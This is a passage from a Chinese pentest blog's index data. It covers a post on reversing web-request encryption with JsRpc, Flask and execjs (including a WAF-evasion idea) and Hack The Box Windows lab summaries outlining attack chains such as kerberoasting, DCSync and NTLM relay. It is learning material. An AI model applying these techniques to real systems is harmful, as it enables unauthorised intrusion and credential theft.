获取是请求还是响应包，需要勾选\u0026lt;请求响应不同加解密\u0026gt;按钮 # 被#隔开的部分是处理header头的部分 ################################################################ # if reqresp != \u0026#34;request\u0026#34;: # return headers + \u0026#34;\\r\\n\\r\\n\\r\\n\\r\\n\u0026#34; + body # if headers is not None: # 开启了请求头加密 # try: # # 获取第一行 # first_line = headers.split(\u0026#34;\\n\u0026#34;)[0].strip() # print(f\u0026#34;first_line: {first_line}\u0026#34;) # # 1.获取method # method = first_line.split(\u0026#34; \u0026#34;)[0].strip() # print(f\u0026#34;method: {method}\u0026#34;) # # 2.获取url # full_path_url = first_line.split(\u0026#34; \u0026#34;)[1].strip().split(\u0026#34;?\u0026#34;) # print(f\u0026#34;full_path_url: {full_path_url}\u0026#34;) # url = full_path_url[0].strip() # print(f\u0026#34;url: {url}\u0026#34;) # # 3.获取query_string # if len(full_path_url) \u0026gt;= 2: # query_string = first_line.split(\u0026#34; \u0026#34;)[1].strip().split(\u0026#34;?\u0026#34;)[1].strip() # else: # query_string = None # print(f\u0026#34;query_string: {query_string}\u0026#34;) # # 4.获取body # payload_string = body # print(f\u0026#34;payload_string: {payload_string}\u0026#34;) # sign_headers = gen_sign(method=method, url=url, query_string=query_string, payload_string=payload_string) # print(f\u0026#34;sign_headers: {sign_headers}\u0026#34;) # # 5.开始替换（先删除后增加） # # 定义正则表达式模式 # key_pattern = r\u0026#34;Key: [a-f0-9]+.*\\n?\u0026#34; # timestamp_pattern = r\u0026#34;Timestamp: \\d+\\.\\d+.*\\n?\u0026#34; # sign_pattern = r\u0026#34;Sign: [a-f0-9]+.*\\n?\u0026#34; # # 替换匹配的字符串为空字符串，同时忽略大小写 # headers = re.sub(key_pattern, \u0026#39;\u0026#39;, headers, flags=re.IGNORECASE) # headers = re.sub(timestamp_pattern, \u0026#39;\u0026#39;, headers, flags=re.IGNORECASE) # headers = re.sub(sign_pattern, \u0026#39;\u0026#39;, headers, flags=re.IGNORECASE) # add_sign_headers = \u0026#34;\\r\\n\u0026#34;.join([f\u0026#34;{key}: {sign_headers[key]}\u0026#34; for key in sign_headers.keys()]) # headers += add_sign_headers # # print(headers) # except: # pass #return headers + \u0026#34;\\r\\n\\r\\n\\r\\n\\r\\n\u0026#34; + body # 返回值为固定格式，不可更改 必需必需必需 ################################################################ ################################################################ encryptdata=encrypt_data(body) return encryptdata # 返回值为固定格式，不可更改 必需必需必需 @app.route(\u0026#39;/decode\u0026#39;, methods=[\u0026#34;POST\u0026#34;]) def decrypt(): body = request.form.get(\u0026#39;dataBody\u0026#39;) # 获取 post 参数 必需 headers = request.form.get(\u0026#39;dataHeaders\u0026#39;) # 获取 post 参数 可选 return headers + \u0026#34;\\r\\n\\r\\n\\r\\n\\r\\n\u0026#34; + body if __name__ == \u0026#39;__main__\u0026#39;: app.debug = True # 设置调试模式，生产模式的时候要关掉debug app.run(host=\u0026#34;0.0.0.0\u0026#34;, port=8888) 实现的一个效果大概如下：\n大概逻辑如下：burp明文\u0026ndash;\u0026gt;autodecoder\u0026ndash;\u0026gt;python Flask\u0026ndash;\u0026gt;js-rpc加密返回结果，这里是加密完成了，处理一下解密：\n使用同样的方法，确认一下解密函数的所在位置： 再次定义函数，尝试解密：\n注入代码：xxx\rvar demo = new Hlclient(\u0026#34;ws://127.0.0.1:12080/ws?group=zzz\u0026#34;);\rwindow.decode = d\rdemo.regAction(\u0026#34;decode\u0026#34;, function (resolve, param) {\rvar res = decode(String(param));\rresolve(res);\r}) http://127.0.0.1:12080/go?group=zzz\u0026amp;action=decode\u0026amp;param=HOy2E7rFAyTFuv1vr1QHq7cHdct8QmlIxHspZJD61rpEqNCa92LNL7ViLIGcmg6pulMs2nYkE0lATS0jgP5rPQ== 最后实现效果，但是这个网站参数较多，只是这样还无法完全使用，但是步骤一致，不做演示:\n后续有待更新。。。。。\n","permalink":"https://yangzhuzai.github.io/posts/skill/001-js%E9%80%86%E5%90%91/","summary":"\u003ch1 id=\"前言\"\u003e前言\u003c/h1\u003e\n\u003cp\u003e实战渗透项目很多时候都能遇到数据包加密的情况，很多时候会觉得棘手，因为很多改包的动作无法实现，但是这样不完全是坏处，特别是一些参数加密的时候，由于数据包加密，所以他们天然存在WAF绕过，将我们的payload加入JS加密的文本中传输，WAF几乎很难识别。\u003c/p\u003e\n\u003cp\u003e目前有两种解决方案，一种是扣JS代码，获取所有的加密函数，中间很容易遇到函数嵌套，陷入扣代码的困局，还有一种是JS-RPC的解决方案，详情可以参考：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://xz.aliyun.com/t/14629?time__1311=GqAhYK0KBKAIP05DKBOxmODRrzc6LK%3D63x#toc-2\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eJS-RPC，详情查看使用方式配合上文食用：\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003ehttps://github.com/jxhczhl/JsRpc\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e简单记录一些遇到的网站，以及如何配合burp插件，方便我们进行渗透：\u003c/p\u003e\n\u003ch1 id=\"一常规扣代码解密\"\u003e一、常规扣代码解密\u003c/h1\u003e\n\u003cp\u003e返回数据包中带有encrypt_data：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCE06fb036892c213ea424de433727ff58bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e浏览器ctrl+shift+f搜索encrypt_data，找到对应的JS代码文件，找到符合要求的，必须为某方法，全部包含该参数的，而非只取某个值，打上断点可以看URL是否正确，以及参数是否对应：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCEce73a6a38d5282da884652c227096b51image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e控制台再次确认参数是否找正确了：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCE3359011f28caf526691da6e5769de273image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e源码里面点进去，找到相关函数：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCEbfa2c9d9cd97a6475566dd72c44bc67bimage.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e把相关的内容放到本地进行调试：\u003c/p\u003e\n\u003cp\u003e这里出现错误，W未定义：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCE1d3417e238773a0070ce8234a73d1150image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e把W也复制过来：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCE839694b9468a1ab934fb75653f1abc39image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e继续把J也复制过来，中间还会遇到好几个函数缺失，都复制过来即可：\u003c/p\u003e\n\u003cp\u003e\u003cimg loading=\"lazy\" src=\"/skills_img/WEBRESOURCE639721e284de5468f2153dc055aa0959image.png\" alt=\"\"  /\u003e\r\n\u003c/p\u003e\n\u003cp\u003e这里就算是逆向完成了，接下来就要做代码层面的嵌入了，用python的execjs库即可：\u003c/p\u003e\n\u003cp\u003epip install pyexecjs2\u003c/p\u003e\n\u003cp\u003edemo01.py\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003eimport requests\r\nimport execjs\r\n\r\nheaders = {\r\n    \u0026#39;accept\u0026#39;: \u0026#39;application/json, text/plain, */*\u0026#39;,\r\n    \u0026#39;accept-language\u0026#39;: \u0026#39;zh-CN\u0026#39;,\r\n    \u0026#39;cache-control\u0026#39;: \u0026#39;no-cache\u0026#39;,\r\n    \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;,\r\n    \u0026#39;origin\u0026#39;: \u0026#39;https://rxxx\u0026#39;,\r\n    \u0026#39;pragma\u0026#39;: \u0026#39;no-cache\u0026#39;,\r\n    \u0026#39;priority\u0026#39;: \u0026#39;u=1, i\u0026#39;,\r\n    \u0026#39;referer\u0026#39;: \u0026#39;https://xxx/\u0026#39;,\r\n    \u0026#39;sec-fetch-dest\u0026#39;: \u0026#39;empty\u0026#39;,\r\n    \u0026#39;sec-fetch-mode\u0026#39;: \u0026#39;cors\u0026#39;,\r\n    \u0026#39;sec-fetch-site\u0026#39;: \u0026#39;cross-site\u0026#39;,\r\n    \u0026#39;user-agent\u0026#39;: \u0026#39;Mozilla/5.0Â\\xa0(compatible;Â\\xa0Baiduspider-render/2.0;Â\\xa0+http://www.baidu.com/search/spider.html)\u0026#39;,\r\n}\r\n\r\ndata = {\r\n    \u0026#39;page\u0026#39;: \u0026#39;1\u0026#39;,\r\n    \u0026#39;num\u0026#39;: \u0026#39;8\u0026#39;,\r\n    \u0026#39;type\u0026#39;: \u0026#39;榜单\u0026#39;,\r\n}\r\n\r\nresponse = requests.post(\u0026#39;https://xxxn/web/webSiteCaNews\u0026#39;, headers=headers, data=data)\r\nencrypt_data= response.json()[\u0026#39;encrypt_data\u0026#39;]\r\nprint(encrypt_data)\r\n\r\ndecrypt = execjs.compile(open(\u0026#39;./demo01.js\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;).read()).call(\u0026#39;Z\u0026#39;,encrypt_data)\r\nprint(decrypt)\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003edemo01.js\u003c/p\u003e","title":"001 JS逆向"},{"content":"个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。\n0x001：Bastard 中等 非域 渗透路线：drupal web漏洞\u0026ndash;\u0026gt;fuzz端点\u0026ndash;\u0026gt;修改poc\u0026ndash;\u0026gt;getshell\u0026ndash;\u0026gt;提权使用winpeass\u0026ndash;\u0026gt;ms15-051\n考点：drupal漏洞信息查找、fuzz的理解、poc理解和使用\n0x002：Arctic 简单 非域 渗透思路：端口扫描无果\u0026ndash;\u0026gt;http访问\u0026ndash;\u0026gt;发现adobe coldfusion\u0026ndash;\u0026gt;漏洞信息查找\u0026ndash;\u0026gt;漏洞利用getshgell\u0026ndash;\u0026gt;提权使用winpeass\u0026ndash;\u0026gt;ms16-032\n考点：较为简单，思路常规，正常渗透即可完成\n0x003：Devel 简单 非域 渗透思路：FTP匿名登录\u0026ndash;\u0026gt;发现web网站和匿名登录目录一致\u0026ndash;\u0026gt;生成asp木马反弹shell\u0026ndash;\u0026gt;提权使用winpeass\u0026ndash;\u0026gt;ms16-032\n考点：较为简单，思路常规，正常渗透即可完成\n0x004：Bastion 中等 非域 渗透思路：smb匿名访问\u0026ndash;\u0026gt;windows image backup \u0026ndash;\u0026gt;发现vhd的备份文件 \u0026ndash;\u0026gt;发现是C盘\u0026ndash;\u0026gt;导出SAM和SYSTEM文件\u0026ndash;\u0026gt;读取hash\u0026ndash;\u0026gt;破解\u0026ndash;\u0026gt;提权\n提权无法直接通过脚本提示，需要查找软件目录，发现非常规软件mRemoteNG\u0026mdash;\u0026gt;信息查找，发现该软件可能存在密码读取的情况\u0026ndash;\u0026gt;漏洞利用，提取administrator密码成功\n考点：VHD硬盘备份、sam文件读取、mRemoteNG密码提取；知识点盲区是本靶场的核心问题。\n0x005：Blue 简单 非域 渗透思路：nmap告诉存在ms17-010\u0026ndash;\u0026gt;需要了解python如何实现ms17-010\n考点：在不依赖msf的情况下，如何打ms17-010\n0x006：Bounty 简单 非域 渗透思路：目录扫描发现上传功能\u0026ndash;\u0026gt;但是无法上传正常的后缀\u0026ndash;\u0026gt;通过fuzz发现可上传.config后缀\u0026ndash;\u0026gt;该后缀在II7.0以上可以getshell\u0026ndash;\u0026gt;提权ms16-032\n考点：config getshell\n0x007：Acute 困难 域渗透（非常规打法） 端口扫描：\n发现443 https端口，浏览器访问失效，通过证书发现域名，修改hosts文件，成功访问到了网页。\nweb渗透：\n首页about us，泄露部分出名员工名称，同时有个新人表单，通过新人表单，可以发现PSWA入口以及默认密码：Password1!，以及创建者主机信息：Acute-PC01以及Lois用户是网站管理员等信息；通过泄露的员工名，拼接首字母和后面的名，使用默认密码，成功撞库PSWA，获取立足点powershell，普通权限，用户名：acute\\edavies。\n后渗透阶段：\n这台靶机目前最好还是使用meterpreter，完全避免使用meterpreter的话，会花费巨量时间，以及部分功能可能无法通过脚本实现。\n后渗透-横向移动阶段1：\n通过查看当前的远程登录会话，可以发现目前的用户acute\\edavies是使用了RDP的，使用meterpreter的屏幕监控功能，查看当前用户的操作，发现了另外一台主机名为：ATSSERVER，以及一个相关凭证：密码：W3_4R3_th3_f0rce.用户：acute\\imonks，使用powershell，申请凭证，获取到ATSSERVER普通权限，可以拿到第一个user.txt，同时使用这个用户可以发现Program Files目录下有个keepmeon目录，是用户安装的，非常规软件目录，但是当前\\imonks用户没有权限进入。\n后渗透-横向移动阶段2：\n在第一个user.txt的附近有主机Acute-PC01的脚本信息，虽然密码进行了加密，但是可以修改脚本达到命令执行的效果，反弹一个脚本内用户的权限为：acute\\jmorgan，属于本地管理员用户组，也就是说我们拿到了Acute-PC01主机的管理员权限。\n后渗透-横向移动阶段3：\n使用Acute-PC01主机的管理员权限dumphash，拿到本地administrator的密码，但是无法登录ATSSERVER，由于我们之前拥有ATSSERVER的imonks用户，通过查看用户目录，可以知道该主机有哪些用户登录过了，使用Acute-PC01主机的密码进行喷洒，成功获取了一个名为awallace的用户。\n后渗透-横向移动阶段4：\nawallace用户可以进去keepmeon目录，这个目录下面有个bat文件，内容为计划任务，执行者为Lois，该用户是最开始告诉我们的网站管理员，同时在域内查找用户组，可以发现，site_admin用户组，该用户组属于domain admin group用户组，也就是说这个计划任务可以让我们获得域管理员组权限，利用这个BAT提权成功，即可获得ATSSERVER主机的管理员权限，拿到最终的flag.\n考点：1、信息收集；2、pswa；3、powershell熟练度；4、内网信息收集，密码获取；5、计划任务提权\n放在最后：这个靶机的打法及其非常规，最开始的信息收集便在一直挑战打靶者的思路完善程度，内网的提权和信息收集过程，更是把两个机器当成一个整体的思维在进行渗透，信息收集的程度堪称离谱，powershell的熟悉程度也是一个不小的挑战，最后的来回横跳巨爽。\n0x008：Timelapse 简单 域渗透 渗透思路： smb匿名访问\u0026ndash;\u0026gt;zip文件\u0026ndash;\u0026gt;破解发现pfx文件\u0026ndash;\u0026gt;再次破解\u0026ndash;\u0026gt;提取出私钥和公钥\u0026ndash;\u0026gt;wirm登录\u0026ndash;\u0026gt;提权，通过查看powershell历史记录，发现账号密码\u0026ndash;\u0026gt;发现该账号具有laps_readers组权限，可以读取administraor密码\n考点：1、PFX；2、laps_readers\n0x009：StreamIO 中等 域渗透 渗透思路： web渗透\u0026ndash;\u0026gt;注意证书的域名变化\u0026ndash;\u0026gt;再次目录扫描\u0026ndash;\u0026gt;发现sql注入\u0026ndash;\u0026gt;获取网站的用户名和密码\u0026ndash;\u0026gt;通过burp爆破，成功获取到合法用户\u0026ndash;\u0026gt;进入后台，注意url存在?\u0026ndash;\u0026gt;fuzz发现debug参数\u0026ndash;\u0026gt;是个文件包含，需要使用base64带出\u0026ndash;\u0026gt;这里的思路有点非常规，爆破当前目录，发现master.php，读取它\u0026ndash;\u0026gt;发现它接收post提交的参数，并执行\u0026ndash;\u0026gt;通过文件包含，并携带参数，命令执行反弹shell\u0026ndash;\u0026gt;读取数据库账号密码\u0026ndash;\u0026gt;winrm登录\u0026ndash;\u0026gt;读取浏览器密码\u0026ndash;\u0026gt;获取到JDgodd用户权限\u0026ndash;\u0026gt;修改CORE STAFF组的拥有者为JDgodd，把自己添加到组内，并修改dacl，读取密码\n考点：1、web渗透的细节；2、sql注入；3、fuzz；4、文件包含；5、代码审计；6、密码获取；7、writeowner权限；8、ldap密码获取\n0x012：Active 简单 域渗透 渗透思路： smb匿名登录\u0026ndash;\u0026gt;发现SYSVOL目录下的gpp组策略文件\u0026ndash;\u0026gt;恢复密码\u0026ndash;\u0026gt;登录smb可以发现flag\u0026ndash;\u0026gt;提权kerberoasting\u0026ndash;\u0026gt;获取administrator成功登录\n考点：1、gpp组策略目录C:\\Windows\\SYSVOL\\DOMAIN\\Policies\\ ；2、kerberoasting\n0x013：Forest 简单 域渗透 渗透思路： ldap匿名访问\u0026ndash;\u0026gt;获取用户名\u0026ndash;\u0026gt;AS-REP Roasting\u0026ndash;\u0026gt;提权\u0026ndash;\u0026gt;bloodhound\u0026mdash;\u0026gt;当前用户拥有写入EXCHANGE WINDOWS PERMISSIONS组的权限\u0026ndash;\u0026gt;EXCHANGE WINDOWS PERMISSIONS可以修改权限，赋予自己dcsync权限\u0026ndash;\u0026gt;dump hash\u0026ndash;\u0026gt;登录administrator\n考点：1、AS-REP Roasting；2、写入权限；3、组完全修改控制权；4、bloodhound即可完成\n0x014：Return 简单 域渗透 渗透思路：\n打印机web NTLM relay \u0026ndash;\u0026gt;winpeass \u0026ndash;\u0026gt;服务提权\n考点：1、NTLM relay；2、服务提权\n0x015：Sauna 简单 域渗透 渗透思路： web页面信息收集，需要手动，名字姓名组合\u0026ndash;\u0026gt;AS-REP Roasting\u0026ndash;\u0026gt;bloodhound发现一个用户具有dcsync权限\u0026ndash;\u0026gt;winpeass发现密码\u0026ndash;\u0026gt;dump即可\n考点：1、信息收集；2、AS-REP Roasting；3、bloodhound\n0x016：Support 简单 域渗透 渗透思路： smb匿名登录\u0026ndash;\u0026gt;添加域名的情况下运行程序\u0026ndash;\u0026gt;抓包获取ldap账号密码\u0026ndash;\u0026gt;ldap查找到密码信息\u0026ndash;\u0026gt;基于资源的约束型委派\n考点：1、ldap信息获取；2、基于资源的约束型委派\n0x017：blackfield 困难 域渗透 渗透思路： smb匿名登录\u0026ndash;\u0026gt;发现用户名\u0026ndash;\u0026gt;AS-REP\u0026ndash;\u0026gt;bloodhound\u0026ndash;\u0026gt;该用户拥有修改AUDIT2020用户的权限\u0026ndash;\u0026gt;再次登录smb\u0026ndash;\u0026gt;发现lsass程序内存dump\u0026ndash;\u0026gt;发现几个用户的可用信息\u0026ndash;\u0026gt;通过bloodhound的指引，利用BACKUP OPERATORS组的用户的权限备份ntds.dit数据库，里面有整个域内的hash\u0026ndash;\u0026gt;成功获得administrator\n考点：1、AS-REP；2、changepassword权限；3、lsass dump；4、BACKUP OPERATORS组权限；5、ntds.dit数据库；\n0x018：matis 困难 域渗透 渗透思路： web 目录扫描\u0026ndash;\u0026gt;发现数据库账号和加密了的密码\u0026ndash;\u0026gt;登录mssql\u0026ndash;\u0026gt;数据库内发现账号密码\u0026ndash;\u0026gt;ldap可登录\u0026ndash;\u0026gt;几乎试完了所有的常规思路\u0026ndash;\u0026gt;ms14-068\n考点：1、目录扫描仔细程度；2、16进制转字符串；3、域渗透思路完善程度，最后尝试ms14-068\n0x019：object 困难 域渗透 渗透思路： web渗透发现jenkins页面\u0026ndash;\u0026gt;可以注册用户\u0026ndash;\u0026gt;可以通过build project来执行命令\u0026ndash;\u0026gt;不过没有创建项目的按钮，需要使用api的方式来进行\u0026ndash;\u0026gt;反弹shell失败，但是可以读取文件\u0026ndash;\u0026gt;读取jenkins用户配置文件\u0026mdash;\u0026gt;复原密码\u0026ndash;\u0026gt;最后成功登录\u0026ndash;\u0026gt;bloodhound 其实提示得比较明显\u0026ndash;\u0026gt;changepasswd\u0026ndash;\u0026gt;Genericwrite，但是这里有问题，理论上我们可以直接拿到目标的权限，但是这里有防火墙干扰，同时又无回显，最后发现桌面的xls表格成功跳转\u0026ndash;\u0026gt;Writeowner\u0026ndash;\u0026gt;domain admins\n考点：1、大量的实操经验；2、信息收集的能力；3、jenkins利用中的小细节，比如二进制读取和复原；4、bloodhound\n0x020：Reel 困难 域渗透 渗透思路：\nftp匿名登录\u0026ndash;\u0026gt;发现提示留言，会查看rtf格式的文件\u0026ndash;\u0026gt;发送钓鱼邮件，RTF调用宏进行上线\u0026ndash;\u0026gt;桌面存在提示信息cred.xml，该文件是 PSCredential 对象当中Export-CliXml方法输出的 XML 文档，可以恢复\u0026ndash;\u0026gt;成功登录后，发现一个csv文件，为bloodhound的结果文件\u0026ndash;\u0026gt;WriteOwner\u0026ndash;\u0026gt;WriteDacl\u0026ndash;\u0026gt;通过Backup_Admins组权限，读取桌面上的Backup文件夹，发现有管理员密码\n考点：1、大量的实操经验；2、rtf文件getshell；3、PSCredential 对象存储密码；4、csv bloodhound；5、WriteOwner和WriteDacl\n0x021：Search 困难 域渗透 渗透思路：\n经过大量的常规思路，发现无果后，发现web页面的图片有账号密码\u0026ndash;\u0026gt;bloodhound\u0026ndash;\u0026gt;kerberoasting\u0026ndash;\u0026gt;返回看smb\u0026ndash;\u0026gt;发现大量用户名\u0026ndash;\u0026gt;密码喷洒发现新可用账户\u0026ndash;\u0026gt;再次查看smb\u0026ndash;\u0026gt;在当前用户名的目录下发现xlsx文件\u0026ndash;\u0026gt;第二行有隐藏，但是使用wps敲一下行数就看得到\u0026ndash;\u0026gt;再次爆破，成功获得新可用账户\u0026ndash;\u0026gt;bloodhound路线获取domain admin\n考点：1、信息收集；2、信息收集；3、信息收集\n0x022：cascade 中等 域渗透 渗透思路：\nldap匿名访问\u0026ndash;\u0026gt;查看敏感信息，发现账号密码\u0026ndash;\u0026gt;登录smb\u0026ndash;\u0026gt;发现vnc注册表信息\u0026ndash;\u0026gt;破解后登录成功\u0026ndash;\u0026gt;使用新的账号密码再次登录smb\u0026ndash;\u0026gt;发现sqlite文件，密码加密\u0026ndash;\u0026gt;同目录的exe程序可解密\u0026ndash;\u0026gt;逆向获取aes信息\u0026ndash;\u0026gt;破解成功\u0026ndash;\u0026gt;AD Recycle组\u0026ndash;\u0026gt;查看删除用户的详细信息\u0026ndash;\u0026gt;该密码和administraotr一样，这一点最开始的smb文件中有提及\n考点：1、信息收集；2、VNC；3、aes解密；4、AD Recycle组\n0x023：Escape 中等 域渗透 渗透思路：\nsmb匿名访问\u0026ndash;\u0026gt;发现mssql账号密码\u0026ndash;\u0026gt;登录mssql进行relay\u0026ndash;\u0026gt;查看mssql 日志\u0026ndash;\u0026gt;发现账户密码\u0026ndash;\u0026gt;adcs ESC1\n考点：1、mssql relay；2、mssql 日志；3、adcs ESC1\n怎么说呢，最短路径很短，但是无脑打的话，就很漫长了\n0x024：Intelligence 中等 域渗透 渗透思路：\nweb渗透发现文件可枚举\u0026ndash;\u0026gt;文件中有可用密码信息\u0026ndash;\u0026gt;提取所有文件的创建人信息\u0026ndash;\u0026gt;密码喷洒\u0026ndash;\u0026gt;成功获取到账户\u0026ndash;\u0026gt;登录smb\u0026ndash;\u0026gt;发现计划任务脚本\u0026mdash;\u0026gt;添加dns解析到本机\u0026ndash;\u0026gt;等待中继\u0026ndash;\u0026gt;破解\u0026ndash;\u0026gt;bloodhound\u0026ndash;\u0026gt;提权到administrator\n考点：1、文件创建者；2、信息获取；3、中继；4、dns解析\n0x025：monteverde 中等 域渗透 渗透思路：\nldap匿名登录\u0026ndash;\u0026gt;获取用户名\u0026ndash;\u0026gt;爆破，用户名即是密码\u0026ndash;\u0026gt;登录smb\u0026ndash;\u0026gt;发现其中一个文件含有密码\u0026ndash;\u0026gt;密码喷洒\u0026ndash;\u0026gt;登录\u0026ndash;\u0026gt;通过Azure AD来获取密码\u0026ndash;\u0026gt;登录administrator\n考点：1、ldap匿名登录；2、Azure AD\n0x032：Aero 中等 非域 渗透思路：\nweb页面发现这是一个win11主题的网站 \u0026ndash;\u0026gt;通过github的信息复现漏洞\u0026ndash;\u0026gt;用户文档文件夹中存在一个cve，通过那个cve直接打就行\n考点：漏洞识别和复现\n0x033：Atom 中等 非域 渗透思路：\nsmb发现文档和程序\u0026ndash;\u0026gt;程序抓包\u0026ndash;\u0026gt;发现会更新程序\u0026ndash;\u0026gt;利用这种更新机制，以及smb文档的解释，可以构造POC来getshell\u0026ndash;\u0026gt;读取redis密码\u0026ndash;\u0026gt;登录redis\u0026ndash;\u0026gt;发现加密密码\u0026ndash;\u0026gt;破解\u0026ndash;\u0026gt;administrator\n考点：1、更新机制getsgell；2、PortableKanban密码解密\n0x034：Querier 中等 非域 渗透思路：\nsmb匿名登录\u0026ndash;\u0026gt;发现带宏的excel表格\u0026ndash;\u0026gt;提取宏脚本\u0026ndash;\u0026gt;获取sqlserver账密信息\u0026ndash;\u0026gt;中继获取hash\u0026ndash;\u0026gt;重新登录sqlserver\u0026ndash;\u0026gt;xp_cmd\u0026ndash;\u0026gt;winpeass发现gpp组策略密码\u0026ndash;\u0026gt;administrator登录成功\n考点：1、宏提取；2、中继；3、gpp组策略\n0x035：Sniper 中等 非域 渗透思路：\nweb渗透发现文件包含\u0026ndash;\u0026gt;通过文件包含读取session文件\u0026ndash;\u0026gt;发现seesion文件中存在用户名\u0026ndash;\u0026gt;把webshell写入用户名中\u0026ndash;\u0026gt;反弹shell\u0026ndash;\u0026gt;数据库账号密码\u0026ndash;\u0026gt;爆破发现是web中某个用户的密码\u0026ndash;\u0026gt;反弹shell\u0026ndash;\u0026gt;在用户文件夹中发现chm文件\u0026ndash;\u0026gt;构造chm的payload\u0026ndash;\u0026gt;中继获取administrator的ntlm hash\u0026ndash;\u0026gt;破解登录\n考点：1、php在windows中的session格式共和存储位置；2、powershell切换身份；3、chmpayload构造\n0x036：BreadCrumbs 困难 非域 渗透思路：\n目录扫描发现登录框\u0026ndash;\u0026gt;注册账户发现用户名\u0026ndash;\u0026gt;发现文件包含\u0026ndash;\u0026gt;读取登录相关代码\u0026ndash;\u0026gt;代码审计\u0026ndash;\u0026gt;伪造登录身份\u0026ndash;\u0026gt;jwt也得伪造，可以读取文件，有key可以伪造\u0026ndash;\u0026gt;替换关键词，免杀\u0026ndash;\u0026gt;web目录发现记录用户信息的文件\u0026ndash;\u0026gt;发现密码\u0026ndash;\u0026gt;桌面发现提示\u0026ndash;\u0026gt;曾经使用过Microsoft Store Sticky Notes记录密码\u0026ndash;\u0026gt;可以进行恢复\u0026ndash;\u0026gt;获取新用户身份\u0026ndash;\u0026gt;在用户目录下发现linux程序\u0026ndash;\u0026gt;strings读取发现web访问记录\u0026ndash;\u0026gt;端口转发本地1234端口\u0026mdash;\u0026gt;发现administrator的aes_key\u0026ndash;\u0026gt;发现sql注入\u0026mdash;\u0026gt;注入获取aes加密密码\u0026ndash;\u0026gt;解密登录\n考点：这个靶机考点很多，包括：文件包含、代码审计、端口转发、简单免杀绕过、简单逆向、JWT、SQL注入、AES加密算法，一定的脚本编写能力\n0x038：Tally 困难 非域 渗透思路：\nweb目录扫描得使用漏洞扫描字典\u0026ndash;\u0026gt;发现文档信息\u0026ndash;\u0026gt;发现ftp用户名和密码\u0026ndash;\u0026gt;登录ftp\u0026ndash;\u0026gt;发现keepass软件\u0026ndash;\u0026gt;破解\u0026ndash;\u0026gt;登录smb\u0026ndash;\u0026gt;在某个目录下看到程序\u0026ndash;\u0026gt;读取程序\u0026ndash;\u0026gt;发现mssql账户密码\u0026ndash;\u0026gt;登录mssql\u0026ndash;\u0026gt;xp_cmd\u0026ndash;\u0026gt;烂土豆提权\n考点：1、目录扫描；2、keepass；3、逆向；4、xp_cmd；5、烂土豆提权\n","permalink":"https://yangzhuzai.github.io/posts/htb/0x000-htb-windows%E9%9D%B6%E6%9C%BA%E6%80%BB%E7%BB%93/","summary":"\u003cp\u003e个人打靶经历，不追求完美，只是记录，早些记录较为粗糙，见谅。\u003c/p\u003e\n\u003ch1 id=\"0x001bastard--中等-非域\"\u003e0x001：Bastard  中等 非域\u003c/h1\u003e\n\u003cp\u003e渗透路线：drupal web漏洞\u0026ndash;\u0026gt;fuzz端点\u0026ndash;\u0026gt;修改poc\u0026ndash;\u0026gt;getshell\u0026ndash;\u0026gt;提权使用winpeass\u0026ndash;\u0026gt;ms15-051\u003c/p\u003e\n\u003cp\u003e考点：drupal漏洞信息查找、fuzz的理解、poc理解和使用\u003c/p\u003e\n\u003ch1 id=\"0x002arctic-简单-非域\"\u003e0x002：Arctic 简单 非域\u003c/h1\u003e\n\u003cp\u003e渗透思路：端口扫描无果\u0026ndash;\u0026gt;http访问\u0026ndash;\u0026gt;发现adobe coldfusion\u0026ndash;\u0026gt;漏洞信息查找\u0026ndash;\u0026gt;漏洞利用getshgell\u0026ndash;\u0026gt;提权使用winpeass\u0026ndash;\u0026gt;ms16-032\u003c/p\u003e\n\u003cp\u003e考点：较为简单，思路常规，正常渗透即可完成\u003c/p\u003e\n\u003ch1 id=\"0x003devel-简单-非域\"\u003e0x003：Devel 简单 非域\u003c/h1\u003e\n\u003cp\u003e渗透思路：FTP匿名登录\u0026ndash;\u0026gt;发现web网站和匿名登录目录一致\u0026ndash;\u0026gt;生成asp木马反弹shell\u0026ndash;\u0026gt;提权使用winpeass\u0026ndash;\u0026gt;ms16-032\u003c/p\u003e\n\u003cp\u003e考点：较为简单，思路常规，正常渗透即可完成\u003c/p\u003e\n\u003ch1 id=\"0x004bastion-中等-非域\"\u003e0x004：Bastion 中等 非域\u003c/h1\u003e\n\u003cp\u003e渗透思路：smb匿名访问\u0026ndash;\u0026gt;windows image backup \u0026ndash;\u0026gt;发现vhd的备份文件 